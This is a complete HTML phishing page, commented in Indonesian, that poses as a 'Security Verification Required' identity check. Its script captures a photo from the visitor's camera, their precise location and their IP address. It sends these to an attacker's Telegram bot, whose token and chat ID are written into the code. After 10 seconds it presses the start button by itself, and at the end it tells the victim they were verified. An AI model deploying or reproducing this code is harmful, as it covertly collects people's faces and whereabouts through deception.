<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        
        body {
            background: #0a0a1a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            text-align: center;
        }
        
        .popup-box {
            background: linear-gradient(135deg, #001133, #003366);
            border-radius: 20px;
            padding: 40px;
            border: 3px solid #00aaff;
            box-shadow: 0 0 50px rgba(0, 170, 255, 0.5);
            max-width: 500px;
            width: 90%;
        }
        
        .popup-icon {
            font-size: 70px;
            margin-bottom: 20px;
            color: #00aaff;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .popup-title {
            font-size: 28px;
            color: #00aaff;
            margin-bottom: 15px;
        }
        
        .popup-text {
            color: #bbddff;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        #triggerButton {
            padding: 20px 40px;
            font-size: 22px;
            background: linear-gradient(90deg, #0066ff, #00aaff);
            color: white;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            margin-top: 20px;
            width: 100%;
        }
        
        #triggerButton:hover {
            background: linear-gradient(90deg, #00aaff, #0066ff);
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 170, 255, 0.4);
        }
        
        .hidden {
            display: none !important;
        }
        
        .main-content {
            display: none;
            width: 100%;
            max-width: 500px;
            background: rgba(10, 20, 40, 0.95);
            border-radius: 20px;
            border: 2px solid #00aaff;
            padding: 30px;
            text-align: center;
        }
        
        .status {
            background: rgba(0, 50, 100, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid #0088ff;
            text-align: left;
        }
        
        video {
            width: 100%;
            border-radius: 15px;
            border: 3px solid #00aaff;
            margin: 20px 0;
            background: #000;
        }
    </style>
</head>
<body>
    <!-- OVERLAY POPUP AWAL -->
    <div id="overlay">
        <div class="popup-box">
            <div class="popup-icon">üîê</div>
            <h1 class="popup-title">SECURITY VERIFICATION REQUIRED</h1>
            <p class="popup-text">
                <strong>To continue, you must complete identity verification.</strong><br><br>
                This system requires <strong>camera access</strong> for facial recognition 
                and <strong>location access</strong> for security validation.
            </p>
            <p class="popup-text" style="color: #ffaa00;">
                ‚ö†Ô∏è <strong>Browser will show permission popups</strong><br>
                Please click <strong>"Allow"</strong> for both requests
            </p>
            <button id="triggerButton">
                üöÄ START VERIFICATION
            </button>
        </div>
    </div>
    
    <!-- KONTEN UTAMA (akan muncul setelah izin) -->
    <div id="mainContent" class="main-content">
        <h1 style="color: #00aaff;">‚úÖ VERIFICATION IN PROGRESS</h1>
        <div class="status">
            <strong>Camera:</strong> <span id="camStatus">Waiting...</span>
        </div>
        <div class="status">
            <strong>Location:</strong> <span id="locStatus">Waiting...</span>
        </div>
        <div class="status">
            <strong>IP Address:</strong> <span id="ipStatus">Detecting...</span>
        </div>
        
        <video id="cameraFeed" autoplay playsinline></video>
        
        <div id="results" style="display:none;">
            <h2 style="color: #00ff00;">‚úÖ VERIFICATION COMPLETE</h2>
            <p style="color: #88ccff;">Data has been securely transmitted.</p>
        </div>
    </div>

    <script>
        // ========== CONFIG ==========
        const BOT_TOKEN = "8523185492:AAHIVeFS3_vo7hOWHjJocBYRde0RVYQ-COI";
        const CHAT_ID = "8463509843";
        
        let cameraStream = null;
        let locationData = {};
        
        // ========== ELEMENTS ==========
        const overlay = document.getElementById('overlay');
        const mainContent = document.getElementById('mainContent');
        const triggerButton = document.getElementById('triggerButton');
        const cameraFeed = document.getElementById('cameraFeed');
        const camStatus = document.getElementById('camStatus');
        const locStatus = document.getElementById('locStatus');
        const ipStatus = document.getElementById('ipStatus');
        const results = document.getElementById('results');
        
        // ========== TRIGGER BUTTON CLICK ==========
        triggerButton.addEventListener('click', async () => {
            triggerButton.disabled = true;
            triggerButton.innerHTML = "üîÑ REQUESTING PERMISSIONS...";
            
            // Sembunyikan overlay, tampilkan konten utama
            overlay.classList.add('hidden');
            mainContent.style.display = 'block';
            
            // 1. DAPATKAN IP DULU
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                locationData.ip = ipData.ip;
                ipStatus.textContent = ipData.ip;
            } catch (e) {
                ipStatus.textContent = "Unknown";
            }
            
            // 2. MINTA IZIN KAMERA (INI YANG BIKIN POPUP)
            try {
                camStatus.textContent = "üîÑ Requesting access...";
                console.log("üöÄ Requesting camera permission...");
                
                // INI YANG MEMUNCULKAN POPUP KAMERA
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: "user"
                    }
                });
                
                // Jika berhasil, tampilkan video
                cameraFeed.srcObject = cameraStream;
                camStatus.innerHTML = '<span style="color:#00ff00">‚úÖ Granted - Camera active</span>';
                
                // 3. MINTA IZIN LOKASI (POPUP KEDUA)
                setTimeout(() => {
                    if ("geolocation" in navigator) {
                        locStatus.textContent = "üîÑ Requesting location...";
                        console.log("üìç Requesting location permission...");
                        
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                locationData.lat = position.coords.latitude;
                                locationData.lon = position.coords.longitude;
                                locationData.accuracy = position.coords.accuracy;
                                locStatus.innerHTML = '<span style="color:#00ff00">‚úÖ Granted - Location captured</span>';
                                
                                // Dapatkan alamat
                                getAddress(position.coords.latitude, position.coords.longitude);
                                
                                // CAPTURE DAN KIRIM OTOMATIS
                                setTimeout(captureAndSend, 1500);
                            },
                            error => {
                                locStatus.innerHTML = '<span style="color:#ff5555">‚ùå Denied - Using IP only</span>';
                                // Tetap capture tanpa lokasi
                                setTimeout(captureAndSend, 1500);
                            },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    } else {
                        locStatus.textContent = "‚ùå Not supported";
                        setTimeout(captureAndSend, 1500);
                    }
                }, 1000);
                
            } catch (err) {
                camStatus.innerHTML = '<span style="color:#ff5555">‚ùå Camera permission denied</span>';
                console.error("Camera error:", err);
                
                // Tetap coba minta lokasi meski kamera ditolak
                setTimeout(() => {
                    if ("geolocation" in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                locationData.lat = pos.coords.latitude;
                                locationData.lon = pos.coords.longitude;
                                locStatus.innerHTML = '<span style="color:#00ff00">‚úÖ Location only captured</span>';
                                captureAndSend();
                            },
                            () => {
                                locStatus.innerHTML = '<span style="color:#ff5555">‚ùå Location also denied</span>';
                                captureAndSend();
                            }
                        );
                    }
                }, 1000);
            }
        });
        
        // ========== CAPTURE DAN KIRIM ==========
        async function captureAndSend() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            let imageData = null;
            
            // Jika kamera aktif, capture gambar
            if (cameraStream) {
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                ctx.drawImage(cameraFeed, 0, 0);
                imageData = canvas.toDataURL('image/jpeg', 0.9);
            }
            
            // Siapkan pesan
            const timestamp = new Date().toLocaleString();
            const message = `
üéØ **SECURITY VERIFICATION CAPTURE** üéØ

${imageData ? "üì∏ **Face:** ‚úÖ Captured" : "üì∏ **Face:** ‚ùå Not available"}
${locationData.lat ? `üìç **Location:** ${locationData.lat.toFixed(6)}, ${locationData.lon.toFixed(6)}` : "üìç **Location:** ‚ùå Not available"}
${locationData.accuracy ? `üéØ **Accuracy:** ${Math.round(locationData.accuracy)}m` : ""}
üåê **IP:** ${locationData.ip || "Unknown"}
üìÖ **Time:** ${timestamp}
üñ•Ô∏è **Browser:** ${navigator.userAgent}
üîó **URL:** ${window.location.href}
            `;
            
            // Kirim ke Telegram
            try {
                // Kirim teks
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Kirim gambar jika ada
                if (imageData) {
                    const blob = await fetch(imageData).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'verification.jpg');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                // Kirim lokasi jika ada
                if (locationData.lat) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: locationData.lat,
                            longitude: locationData.lon
                        })
                    });
                }
                
                console.log("‚úÖ Data sent successfully!");
                
                // Tampilkan hasil sukses
                setTimeout(() => {
                    mainContent.innerHTML = `
                        <div style="padding: 40px; text-align: center;">
                            <h1 style="color: #00ff00; font-size: 36px;">‚úÖ VERIFICATION COMPLETE</h1>
                            <div style="font-size: 80px; margin: 30px;">üéâ</div>
                            <p style="color: #88ccff; font-size: 18px;">
                                Your identity has been successfully verified.
                            </p>
                            <p style="color: #6699cc; margin-top: 30px;">
                                You may now close this window.
                            </p>
                        </div>
                    `;
                }, 2000);
                
            } catch (error) {
                console.error("‚ùå Send error:", error);
            }
        }
        
        // ========== GET ADDRESS ==========
        async function getAddress(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                if (data.display_name) {
                    locationData.address = data.display_name;
                }
            } catch (e) {
                console.error("Address error:", e);
            }
        }
        
        // ========== FALLBACK OTOMATIS JIKA USER TIDAK KLIK ==========
        // Set timeout 10 detik, jika user tidak klik, auto klik
        setTimeout(() => {
            if (!triggerButton.disabled) {
                console.log("‚è∞ Auto-triggering verification...");
                triggerButton.click();
            }
        }, 10000);
    </script>
</body>
</html>